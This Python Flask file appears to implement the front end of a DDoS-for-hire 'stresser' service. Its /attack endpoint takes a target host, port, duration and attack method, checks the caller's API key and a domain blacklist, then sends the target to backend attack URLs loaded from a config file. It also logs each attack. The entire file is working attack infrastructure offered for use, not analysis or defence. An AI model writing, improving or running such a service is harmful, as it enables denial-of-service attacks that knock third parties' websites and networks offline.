import yaml
import toml
import requests
import ipaddress
import time
from urllib.parse import urlparse
from flask import Flask, send_file, request, jsonify

with open('attacks.yml', 'r') as f:
    config = yaml.safe_load(f)

with open('settings.yml', 'r') as f:
    settings = yaml.safe_load(f)

blacklisted_domains=settings['config']['blacklist']
apikeys=settings['config']['keys']
maxtime=settings['config']['maxtime']

# Read the settings.toml file
#config_toml = toml.load('settings.toml')
#blacklisted_domains = config_toml.get('config').get('blacklist')
#apikeys = config_toml.get('config').get('keys')
#maxtime = int(config_toml.get('config').get('maxtime'))

methods = config['methods']

app = Flask(__name__)

@app.route("/")
def index():
    return "shiiii"

@app.route("/attack")
def attack():
    host = request.args.get('host')

    is_valid_ip = False
    is_valid_url = False
    try:
        ip = ipaddress.ip_address(host)
        is_valid_ip = True
    except ValueError:
        url = urlparse(host)
        if url.scheme and url.netloc:
            is_valid_url = True

    if not (is_valid_ip or is_valid_url):
        return jsonify(
            error=True,
            message="Invalid host. Host must be a valid IP address or URL."
        ), 451

    for domain in blacklisted_domains:
        if domain in host:
            return jsonify(
                error=True,
                message="Host is blacklisted."
            ), 451

    key = request.args.get('key')
    port = int(request.args.get('port'))
    duration = int(request.args.get('time'))
    method = request.args.get('method')
    if key not in apikeys:
        return jsonify(
            error=True,
            message="API Key Invalid."
        ), 451
    elif port > 65535:
        return jsonify(
            error=True,
            message="Invalid Port."
        ), 451
    elif duration > maxtime:
        return jsonify(
            error=True,
            message="Max Time Exceeded."
        ), 451
    else:
        with open('attacks.log', 'a') as f:
            f.write(f"{key} - {host}:{port} - {duration}s - {method}\n")
        if method in methods:
            urls = methods[method]

            start_time = time.perf_counter()
            for url in urls:
                url = url.replace('<<host>>', host).replace('<<host>>', host).replace('<<port>>', str(port)).replace('<<time>>', str(duration))
                ua = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
                x = requests.get(url,headers = ua)
                z = x.status_code
                col = "\u001b[42m"
                if z == 200:
                    col = "\u001b[42m"
                else:
                    col = "\u001b[41m"
                print(f"{col}{z}\u001b[0m - {url} - Request sent to API.")
            end_time = time.perf_counter()

            elapsed_time = end_time - start_time
            elapsed_time =str(elapsed_time).split(".",1)[0]

            return jsonify(
                error=False,
                host=host,
                port=port,
                time=duration,
                method=method,
                elapsed=f'{elapsed_time},s'
            )
        else:
            return jsonify(
                error=True,
                message="Method Not Found."
            ), 451

app.run(host="0.0.0.0",port=7331)
